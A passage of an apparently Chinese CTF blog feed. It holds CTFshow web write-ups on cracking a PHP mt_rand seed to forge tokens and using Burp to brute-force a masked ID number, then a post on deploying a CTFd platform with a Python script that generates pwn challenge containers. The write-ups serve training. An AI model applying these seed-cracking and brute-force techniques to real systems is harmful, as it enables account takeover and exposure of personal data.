UTC 2022 Linux version 5.4.0-126-generic (buildd@lcy02-amd64-072) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #142-Ubuntu SMP Fri Aug 26 12:12:57 UTC 2022</span></span><br></pre></td></tr></table></figure><ul><li>hint</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013100955137.png" alt="image-20221013100955137"></p><ul><li>可以先通过r=0 得到mt_rand()第一个值为539472865</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013142205465.png" alt="image-20221013142205465"></p><ul><li>再利用php_mt_seed-4.0推出种子</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013142439718.png" alt="image-20221013142439718"></p><ul><li>通过这两行代码，去计算出token，其中seed的选择要与自己题目用到的php版本相近的seed</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013143622262.png" alt="image-20221013143622262"></p><ul><li>我的php版本是php7.3.11</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013143911408.png" alt="image-20221013143911408"></p><ul><li>计算token代码</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013142450572.png" alt="image-20221013142450572"></p><ul><li>flag</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013142138878.png" alt="image-20221013142138878"></p><h2 id="web26">web26</h2><ul><li>打开题目后一直下一步，不输入任何东西，直接burp抓包后直接repeater发包就能得到flag（这应该算是非预期吧）</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013144535082.png" alt="image-20221013144535082"></p><ul><li><p>正常的做题姿势</p></li><li><p>burp抓包后用Intruder模块进行爆破</p></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013153318406.png" alt="image-20221013153318406"></p><h2 id="web27">web27</h2><ul><li><p>打开题目，得到一份录取名单，教务管理系统，学院录取查询系统</p></li><li><p>得到身份证信息不清晰，那就抓包爆破</p></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013153948233.png" alt="image-20221013153948233"></p><ul><li>成功爆破出完整的身份证号码</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013154808908.png" alt="image-20221013154808908"></p><ul><li>解出响应包的Unicode编码，得到学号和密码</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013154924410.png" alt="image-20221013154924410"></p><ul><li>flag</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013155129376.png" alt="image-20221013155129376"></p><h2 id="web28">web28</h2><ul><li>题目</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013155522718.png" alt="image-20221013155522718"></p><ul><li>hint</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013155446524.png" alt="image-20221013155446524"></p><ul><li>抓包爆破</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013155743060.png" alt="image-20221013155743060"></p><ul><li>payloads设置：1和2都是一样</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013155751816.png" alt="image-20221013155751816"></p><ul><li>爆破成功</li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20221013160751377.png" alt="image-20221013160751377"></p>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>招新平台的搭建与维护</title>
      <link href="/posts/52933/"/>
      <url>/posts/52933/</url>
      
        <content type="html"><![CDATA[<h1>搭建</h1><h2 id="需求">需求</h2><blockquote><ol><li>能满足互联网访问</li><li>web和pwn的环境是可以使用动态容器</li></ol></blockquote><h2 id="准备">准备</h2><blockquote><p>平台：开源项目<a href="https://github.com/CTFd/CTFd">CTFd</a></p><p>服务器：一个可以联网的，稳定运行的服务器（我们的平台用的是Ubuntu系统）</p><p>部署：docker部署</p><p>CTFd动态容器插件：<a href="https://github.com/glzjin/CTFd-Whale">CTFd-Whale</a></p><p>一键部署多个pwn题的环境：<a href="https://github.com/giantbranch/pwn_deploy_chroot">pwn_deploy_chroot</a></p></blockquote><h2 id="教程">教程</h2><ol><li>懒人一键部署版：<a href="https://www.yuque.com/hxfqg9/misc/ctfd"><strong>CTFd&amp;ctfd-whale动态靶机搭建与维护</strong></a></li><li>从头专研部署版：<a href="https://www.yuque.com/dat0u/ctfd/iogmqx"><strong>CTFd动态靶机搭建教程</strong></a></li></ol><h2 id="个人搭建心得">个人搭建心得</h2><ol><li>因为个人技术道行不足，加上个人开摆心态，我选择的是<strong>懒人版本</strong></li><li>这个版本git项目下来之后需要把<code>docker-compose.yml</code>里的一行代码注释或者删掉才能起得来（这个只针对懒人版）</li></ol><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220927133547426.png" alt="image-20220927133547426"></p><h1>对平台的优化</h1><ol><li>服务绑定了域名，利用nginx进行代理80和443端口并绑定域名</li><li>以及其他的优化，都写在了<a href="https://alphaeeee.github.io/2022/08/18/CTFd%E5%B9%B3%E5%8F%B0%E4%B8%AA%E6%80%A7%E5%8C%96/">CTFd平台个性化</a>里</li></ol><h1>动态容器题目部署</h1><h2 id="web">web</h2><ul><li><p>使用Github上开源的镜像做基础，分有分有很多类型，具体查看<a href="https://github.com/ctfhub-team/ctfhub_base_image">ctfhub_base_image</a></p></li><li><p>web题目的模板结构</p></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220927185302806.png" alt="image-20220927185302806"></p><h2 id="pwn">pwn</h2><ul><li><p>在<a href="https://github.com/ctfhub-team/ctfhub_base_image">ctfhub_base_image</a>这个仓库里面也有pwn的环境，还有一个<a href="https://github.com/TaQini/pwn_docker">pwn_docker</a>，但是这两个我都没用上，而是用了<a href="https://github.com/giantbranch/pwn_deploy_chroot">pwn_deploy_chroot</a>，这个环境可以一键部署多个题目，而且根据大佬们的博客教程上说，这个环境相对安全一点</p></li><li><p><code>pwn_deploy_chroot</code>里的<code>initialize.py</code>是用的python2的语法，所以运行时首先要看一下自己的python版本</p></li></ul><p><img src="https://alpha-blog-image.oss-cn-shenzhen.aliyuncs.com/image/image-20220927184518298.png" alt="image-20220927184518298"></p><ul><li>如果系统中默认是python3的，又不想装python2，可以把<code>initialize.py</code>改成我的</li><li>源码：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFileList</span>():</span><br><span class="line">    filelist = []</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(PWN_BIN_PATH):</span><br><span class="line">        filelist.append(filename)</span><br><span class="line">    filelist.sort()</span><br><span class="line">    <span class="keyword">return</span> filelist</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">isExistBeforeGetFlagAndPort</span>(<span class="params">filename, contentBefore</span>):</span><br><span class="line">    filename_tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    tmp_dict = <span class="string">&quot;&quot;</span></span><br><span class="line">    ret = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> contentBefore:</span><br><span class="line">        tmp_dict = json.loads(line)</span><br><span class="line">        filename_tmp = tmp_dict[<span class="string">&quot;filename&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> filename == filename_tmp:</span><br><span class="line">            ret = [tmp_dict[<span class="string">&quot;flag&quot;</span>], tmp_dict[<span class="string">&quot;port&quot;</span>]]</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateFlags</span>(<span class="params">filelist</span>):</span><br><span class="line">    tmp_flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    contentBefore = []</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(FLAG_BAK_FILENAME):</span><br><span class="line">        os.popen(<span class="string">&quot;touch &quot;</span> + FLAG_BAK_FILENAME)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(FLAG_BAK_FILENAME, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            line = f.readline()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            contentBefore.append(line)</span><br><span class="line">    <span class="comment"># bin&#x27;s num != flags.txt&#x27;s linenum, empty the flags.txt</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(filelist) != <span class="built_in">len</span>(contentBefore):</span><br><span class="line">        os.popen(<span class="string">&quot;echo &#x27;&#x27; &gt; &quot;</span> + FLAG_BAK_FILENAME)</span><br><span class="line">        contentBefore = []</span><br><span class="line">    port = PORT_LISTEN_START_FROM + <span class="built_in">len</span>(contentBefore)</span><br><span class="line">    flags = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(FLAG_BAK_FILENAME, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> filelist:</span><br><span class="line">            flag_dict = &#123;&#125;</span><br><span class="line">            ret = isExistBeforeGetFlagAndPort(filename, contentBefore)</span><br><span class="line">            <span class="keyword">if</span> ret == <span class="literal">False</span>:</span><br><span class="line">                tmp_flag = <span class="string">&quot;flag&#123;&quot;</span> + <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">                flag_dict[<span class="string">&quot;port&quot;</span>] = port</span><br><span class="line">                port = port + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp_flag = ret[<span class="number">0</span>]</span><br><span class="line">                flag_dict[<span class="string">&quot;port&quot;</span>] = ret[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">            flag_dict[<span class="string">&quot;filename&quot;</span>] = filename</span><br><span class="line">            flag_dict[<span class="string">&quot;flag&quot;</span>] = tmp_flag</span><br><span class="line">            flag_json = json.dumps(flag_dict)</span><br><span class="line">            <span class="built_in">print</span> (flag_json)</span><br><span class="line">            f.write(flag_json + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            flags.append(tmp_flag)</span><br><span class="line">    <span class="keyword">return</span> flags</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateXinetd</span>(<span class="params">filelist</span>):</span><br><span class="line">    contentBefore = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(FLAG_BAK_FILENAME, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            line = f.readline()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            contentBefore.append(line)</span><br><span class="line">    conf = <span class="string">&quot;&quot;</span></span><br><span class="line">    uid = <span class="number">1000</span></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> filelist:</span><br><span class="line">        port = isExistBeforeGetFlagAndPort(filename, contentBefore)[<span class="number">1</span>]</span><br><span class="line">        conf += XINETD % (port, <span class="built_in">str</span>(uid) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(uid), filename, filename)</span><br><span class="line">        uid = uid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(XINETD_CONF_FILENAME, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(conf)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateDockerfile</span>(<span class="params">filelist, flags</span>):</span><br><span class="line">    conf = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment"># useradd and put flag</span></span><br><span class="line">    runcmd = <span class="string">&quot;RUN &quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> filelist:</span><br><span class="line">        runcmd += <span class="string">&quot;useradd -m &quot;</span> + filename + <span class="string">&quot; &amp;&amp; &quot;</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(filelist)):</span><br><span class="line">        <span class="keyword">if</span> x == <span class="built_in">len</span>(filelist) - <span class="number">1</span>:</span><br><span class="line">            runcmd += <span class="string">&quot;echo &#x27;&quot;</span> + flags[x] + <span class="string">&quot;&#x27; &gt; /home/&quot;</span> + filelist[x] + <span class="string">&quot;/flag.txt&quot;</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            runcmd += <span class="string">&quot;echo &#x27;&quot;</span> + flags[x] + <span class="string">&quot;&#x27; &gt; /home/&quot;</span> + filelist[x] + <span class="string">&quot;/flag.txt&quot;</span> + <span class="string">&quot; &amp;&amp; &quot;</span></span><br><span class="line">    <span class="comment"># print runcmd </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># copy bin</span></span><br><span class="line">    copybin = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> filelist:</span><br><span class="line">        copybin += <span class="string">&quot;COPY &quot;</span> + PWN_BIN_PATH + <span class="string">&quot;/&quot;</span> + filename  + <span class="string">&quot; /home/&quot;</span> + filename + <span class="string">&quot;/&quot;</span> + filename + <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="keyword">if</span> REPLACE_BINSH:</span><br><span class="line">            copybin += <span class="string">&quot;COPY ./catflag&quot;</span> + <span class="string">&quot; /home/&quot;</span> + filename + <span class="string">&quot;/bin/sh\n&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            copybin += <span class="string">&quot;COPY ./catflag&quot;</span> + <span class="string">&quot; /home/&quot;</span> + filename + <span class="string">&quot;/bin/sh\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print copybin</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># chown &amp; chmod</span></span><br><span class="line">    chown_chmod = <span class="string">&quot;RUN &quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(filelist)):</span><br><span class="line">        chown_chmod += <span class="string">&quot;chown -R root:&quot;</span> + filelist[x] + <span class="string">&quot; /home/&quot;</span> + filelist[x] + <span class="string">&quot; &amp;&amp; &quot;</span></span><br><span class="line">        chown_chmod += <span class="string">&quot;chmod -R 750 /home/&quot;</span> + filelist[x] + <span class="string">&quot; &amp;&amp; &quot;</span></span><br><span class="line">        <span class="keyword">if</span> x == <span class="built_in">len</span>(filelist) - <span class="number">1</span>:</span><br><span class="line">            chown_chmod += <span class="string">&quot;chmod 740 /home/&quot;</span> + filelist[x] + <span class="string">&quot;/flag.txt&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            chown_chmod += <span class="string">&quot;chmod 740 /home/&quot;</span> + filelist[x] + <span class="string">&quot;/flag.txt&quot;</span> + <span class="string">&quot; &amp;&amp; &quot;</span></span><br><span class="line">    <span class="comment"># print chown_chmod</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># copy lib,/bin </span></span><br><span class="line">    <span class="comment"># dev = &#x27;&#x27;&#x27;mkdir /home/%s/dev &amp;&amp; mknod /home/%s/dev/null c 1 3 &amp;&amp; mknod /home/%s/dev/zero c 1 5 &amp;&amp; mknod /home/%s/dev/random c 1 8 &amp;&amp; mknod /home/%s/dev/urandom c 1 9 &amp;&amp; chmod 666 /home/%s/dev/* &amp;&amp; &#x27;&#x27;&#x27;</span></span><br><span class="line">    dev = <span class="string">&#x27;&#x27;&#x27;mkdir /home/%s/dev &amp;&amp; mknod /home/%s/dev/null c 1 3 &amp;&amp; mknod /home/%s/dev/zero c 1 5 &amp;&amp; mknod /home/%s/dev/random c 1 8 &amp;&amp; mknod /home/%s/dev/urandom c 1 9 &amp;&amp; chmod 666 /home/%s/dev/* &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> REPLACE_BINSH:</span><br><span class="line">        <span class="comment"># ness_bin = &#x27;&#x27;&#x27;mkdir /home/%s/bin &amp;&amp; cp /bin/sh /home/%s/bin &amp;&amp; cp /bin/ls /home/%s/bin &amp;&amp; cp /bin/cat /home/%s/bin&#x27;&#x27;&#x27;</span></span><br><span class="line">        ness_bin = <span class="string">&#x27;&#x27;&#x27;&amp;&amp; cp /bin/sh /home/%s/bin &amp;&amp; cp /bin/ls /home/%s/bin &amp;&amp; cp /bin/cat /home/%s/bin&#x27;&#x27;&#x27;</span></span><br><span class="line">    copy_lib_bin_dev = <span class="string">&quot;RUN &quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(filelist)):</span><br><span class="line">        copy_lib_bin_dev += <span class="string">&quot;cp -R /lib* /home/&quot;</span> + filelist[x]  + <span class="string">&quot; &amp;&amp; &quot;</span></span><br><span class="line">        copy_lib_bin_dev += <span class="string">&quot;cp -R /usr/lib* /home/&quot;</span> + filelist[x]  + <span class="string">&quot; &amp;&amp; &quot;</span></span><br><span class="line">        copy_lib_bin_dev += dev % (filelist[x], filelist[x], filelist[x], filelist[x], filelist[x], filelist[x])</span><br><span class="line">        <span class="keyword">if</span> x == <span class="built_in">len</span>(filelist) - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> REPLACE_BINSH:</span><br><span class="line">                copy_lib_bin_dev += ness_bin % (filelist[x], filelist[x], filelist[x])</span><br><span class="line">            <span class="keyword">pass</span>                </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> REPLACE_BINSH:   </span><br><span class="line">                copy_lib_bin_dev += ness_bin % (filelist[x], filelist[x], filelist[x]) + <span class="string">&quot; &amp;&amp; &quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                copy_lib_bin_dev += <span class="string">&quot; &amp;&amp; &quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print copy_lib_bin_dev</span></span><br><span class="line"></span><br><span class="line">    conf = DOCKERFILE % (runcmd, copybin, chown_chmod, copy_lib_bin_dev)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;Dockerfile&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(conf)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateDockerCompose</span>(<span class="params">length</span>):</span><br><span class="line">    conf = <span class="string">&quot;&quot;</span></span><br><span class="line">    ports = <span class="string">&quot;&quot;</span></span><br><span class="line">    port = PORT_LISTEN_START_FROM</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,length):</span><br><span class="line">        ports += <span class="string">&quot;- &quot;</span> + <span class="built_in">str</span>(port) + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(port) + <span class="string">&quot;\n    &quot;</span></span><br><span class="line">        port = port + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    conf = DOCKERCOMPOSE % ports</span><br><span class="line">    <span class="comment"># print conf</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;docker-compose.yml&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(conf)</span><br><span class="line"></span><br><span class="line"><span class="comment"># def generateBinPort(filelist):</span></span><br><span class="line"><span class="comment">#     port = PORT_LISTEN_START_FROM</span></span><br><span class="line"><span class="comment">#     tmp = &quot;&quot;</span></span><br><span class="line"><span class="comment">#     for filename in filelist:</span></span><br><span class="line"><span class="comment">#         tmp += filename  + &quot;&#x27;s port: &quot; + str(port) + &quot;\n&quot;</span></span><br><span class="line"><span class="comment">#         port = port + 1</span></span><br><span class="line"><span class="comment">#     print tmp</span></span><br><span class="line"><span class="comment">#     with open(PORT_INFO_FILENAME, &#x27;w&#x27;) as f:</span></span><br><span class="line"><span class="comment">#         f.write(tmp)</span></span><br><span class="line">    </span><br><span class="line">filelist = getFileList()</span><br><span class="line">flags = generateFlags(filelist)</span><br><span class="line"><span class="comment"># generateBinPort(filelist)</span></span><br><span class="line">generateXinetd(filelist)</span><br><span class="line">generateDockerfile(filelist, flags)</span><br><span class="line">generateDockerCompose(<span class="built_in">len</span>(filelist))</span><br></pre></td></tr></table></figure><h1>运维历程</h1><p style="text-indent: 2em;">平台搭好之后就是上题，能正常的访问和答题，界面也都只是初始的样子，在我返校前这段时间就是在琢磨怎么把web和pwn的环境搭起来，也学习了一下Dockerfile和docker-compose.yml的编写。</p><p style="text-indent: 2em;">回校之后就是做平台页面的个性化，增加了四个子页面，最初是全部展示在导航栏上的，后面在群里问了师傅们，去看了一下BUU平台的源码，然后照葫芦画瓢的弄出了收缩版的，使得导航栏没有这么的拥挤。还有也是看到BUU平台上的web题目的链接可以直接点击跳转，也想在招新平台上实现，在和群里的师傅们交流之后也是能实现了，但是美中不足的是，pwn题目是不需要这个功能的，但是修改之后pwn的链接也和web一样可以直接点击，这还有待优化。</p><p style="text-indent: 2em;">9月份开学之后，平台上也越来越多学弟学妹去注册做题了，然后有一天就不知道什么原因，web的题目全体罢工了，全都连接不上了，重装docker，把所有环境全部重来安装也不行，最后重装系统也是不行，最后换到了我的服务器上就好了，我也不知道什么原因（之前是部署在学长的服务器上），然后前几天打完美团的CTF之后有一道题，学长觉得很好就改了一下放到了平台上，搭起来之后，我一直就是打不通，但是我在自己本地docker起的时候是能通的，后面排查出是因为CTFd平台默认是所有的容器都不出网，导致了题目无法正常的弹shell，然后我就开始在本地的服务器上去部署实验，最后是能出网了，我就开始按着在本地怎么操作的，到云服务器上操作一遍，但是就是死活不成功，还有就是要么成了之后平台点进挑战的界面就一直转圈圈，无法加载出来。我就又重新搭了一遍，这次就把web和pwn的题目全下了，后面就想着既然本地的能跑，那就把本地服务映射出去，最初是看的是frp，但是看着配置有点麻烦，然后又恰好发现了一个新的神器nps，简单的了解了一下之后就开始上手，现在已经能稳定的运行了，但是最近的校园网网络环境非常的不好，服务器偶尔会掉线，导致了服务不能正常的访问。</p><h1>题外话</h1><blockquote><p>最近在csdn上发现了一个大佬做的毕设，是ctf平台的，看了简介之后有点小心动，他的项目也是开源了，在GitHub上可以看得到，所以找个时间，我把平台搭起来试一下看如何。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFd平台个性化</title>
      <link href="/posts/61429/"/>
      <url>/posts/61429/</url>
      
        <content type="html"><![CDATA[<h1>平台前端页面框架</h1><blockquote><p>2022-8-18第一版</p></blockquote><h2 id="主页">主页</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-md-6 offset-md-3&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;w-100 mx-auto d-block&quot;</span> <span class="attr">style</span>=<span class="string">&quot;max-width: 500px;padding: 50px;padding-top: 14vh;&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">src</span>=<span class="string">&quot;平台中央logo&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;text-center&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span> text <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;url&quot;</span>&gt;</span>text<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center;&quot;</span>&gt;</span>QQ群名<span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">href</span>=<span class="string">&quot;QQ群链接&quot;</span>&gt;</span>  QQ群号 <span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span 